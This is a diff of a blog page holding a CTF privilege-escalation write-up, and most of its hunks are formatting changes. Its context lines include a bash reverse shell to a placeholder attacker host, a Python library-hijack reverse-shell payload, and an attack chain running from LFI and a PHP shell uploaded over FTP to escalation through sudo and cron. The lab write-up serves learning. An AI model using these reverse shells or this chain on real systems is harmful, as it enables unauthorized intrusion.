@@ -107,10 +107,10 @@
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-O</span> <span class="nt">-p</span> 21,22,80 &lt;TARGET_IP&gt;
 
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.5
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+PORT STATE SERVICE VERSION
+21/tcp open ftp vsftpd 3.0.5
+22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp open http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
 </code></pre></div></div>
 
 <p>FTP, SSH, and a web server. Adding it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> before poking at the site:</p>
@@ -200,7 +200,7 @@ ftp&gt; quit
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
 
 User www-data may run the following commands on &lt;TARGET_IP&gt;:
-    <span class="o">(</span>toby<span class="o">)</span> NOPASSWD: ALL
+ <span class="o">(</span>toby<span class="o">)</span> NOPASSWD: ALL
 </code></pre></div></div>
 
 <p>That’s about as direct as escalation gets:</p>
@@ -238,7 +238,7 @@ bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/&lt;ATTACKER_PORT&gt; 0&gt;&amp;1
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
 
 User mat may run the following commands on &lt;TARGET_IP&gt;:
-    <span class="o">(</span>will<span class="o">)</span> NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py <span class="k">*</span>
+ <span class="o">(</span>will<span class="o">)</span> NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py <span class="k">*</span>
 </code></pre></div></div>
 
 <p><code class="language-plaintext highlighter-rouge">will_script.py</code> checks a command against a whitelist before running it — reasonable enough, except it imports its whitelist-checking function like this:</p>
@@ -257,7 +257,7 @@ User mat may run the following commands on &lt;TARGET_IP&gt;:
 <span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
 <span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="nf">call</span><span class="p">([</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">-i</span><span class="sh">"</span><span class="p">])</span>
 <span class="k">def</span> <span class="nf">get_command</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
-    <span class="k">return</span> <span class="sh">""</span>
+ <span class="k">return</span> <span class="sh">""</span>
 </code></pre></div></div>
 
 <p>The <code class="language-plaintext highlighter-rouge">get_command</code> stub at the end matters more than it looks — <code class="language-plaintext highlighter-rouge">will_script.py</code> calls it right after the import, and without a matching function it would crash before the shell ever got a chance to connect.</p>
@@ -277,7 +277,7 @@ User mat may run the following commands on &lt;TARGET_IP&gt;:
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span> /opt/backups/key.b64
 
-<span class="nt">-rw-rw----</span> 1 root adm 2270 Dec  3  2020 key.b64
+<span class="nt">-rw-rw----</span> 1 root adm 2270 Dec 3 2020 key.b64
 </code></pre></div></div>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /opt/backups/key.b64 | <span class="nb">base64</span> <span class="nt">-d</span>
@@ -301,17 +301,29 @@ ssh <span class="nt">-i</span> root_key.pem root@&lt;TARGET_IP&gt;
 
 <div class="mermaid">
 graph TD
-    A["Nmap<br />FTP, SSH, HTTP"] --&gt; B["robots.txt<br />hints at hidden files"]
-    B --&gt; C["LFI in post.php<br />source disclosure"]
-    C --&gt; D["LFI<br />leaked FTP credentials"]
-    D --&gt; E["FTP access"]
-    E --&gt; F["Upload PHP reverse shell<br />via FTP"]
-    F --&gt; G["Trigger via LFI<br />RCE as www-data"]
-    G --&gt; H["sudo NOPASSWD<br />escalate to toby"]
-    H --&gt; I["Editable cron job<br />escalate to mat"]
-    I --&gt; J["Python Library Hijacking<br />escalate to will"]
-    J --&gt; K["linpeas finds<br />base64 SSH key"]
-    K --&gt; L["Decode and SSH<br />as root"]
+ subgraph RECON["RECON"]
+  A["Nmap FTP SSH HTTP"]
+ end
+ 
+ subgraph ENUM["ENUMERATION"]
+  B["robots.txt hint"] --&gt; C["LFI in post.php source disclosure"]
+  C --&gt; D["LFI leak FTP credentials"]
+ end
+ 
+ subgraph EXPL["EXPLOITATION"]
+  E["FTP access"] --&gt; F["Upload PHP reverse shell"]
+  F --&gt; G["Trigger via LFI RCE www-data"]
+ end
+ 
+ subgraph PRIVESC["PRIVESC"]
+  H["sudo NOPASSWD escalate toby"] --&gt; I["Cron job escalate mat"]
+  I --&gt; J["Python hijacking escalate will"]
+  J --&gt; K["SSH key discovered escalate root"]
+ end
+ 
+ A --&gt; B
+ D --&gt; E
+ G --&gt; H
 </div>
 
 <hr />
@@ -323,6 +335,23 @@ graph TD
 <p><strong>Escalation chains reward finishing the enumeration, not just the exploit.</strong> Every single hop here — sudo, cron, Python imports, file permissions — was a fresh, independent check. Stopping after the first successful trick would have ended things at <code class="language-plaintext highlighter-rouge">toby</code>.</p>
 
 <p><strong>An import without a path is a location, not just a name.</strong> <code class="language-plaintext highlighter-rouge">from cmd import get_command</code> trusts wherever Python happens to look first, and the current working directory comes before the standard library.</p>
+
+
+  <script src="https://giscus.app/client.js"
+        data-repo="renekerr/renekerr.github.io"
+        data-repo-id="R_kgDOS3a2UA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOS3a2UM4DCBOG"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="en"
+        crossorigin="anonymous"
+        async>
+</script>
 
 </div>
 
@@ -338,27 +367,27 @@ graph TD
     
       <li>
         <h3>
-          <a href="/ctf/web/2026/07/10/blog/">
-            Blog
-            <small>10 Jul 2026</small>
+          <a href="/ctf/puzzle/steganography/web/privesc/2026/08/19/biohazard-ctf/">
+            Biohazard CTF: Unraveling a Resident Evil Puzzle Box
+            <small>19 Aug 2026</small>
           </a>
         </h3>
       </li>
     
       <li>
         <h3>
-          <a href="/websec/2026/07/07/username-enumeration-timing/">
-            Username Enumeration via Response Timing
-            <small>07 Jul 2026</small>
+          <a href="/ctf/web/privesc/joomla/2026/08/16/joker-ctf/">
+            Joker CTF
+            <small>16 Aug 2026</small>
           </a>
         </h3>
       </li>
     
       <li>
         <h3>
-          <a href="/ctf/2026/07/06/stuxctf/">
-            StuxCTF
-            <small>06 Jul 2026</small>
+          <a href="/ctf/web/privesc/2026/08/09/boilerctf/">
+            BoilerCTF
+            <small>09 Aug 2026</small>
           </a>
         </h3>
       </li>
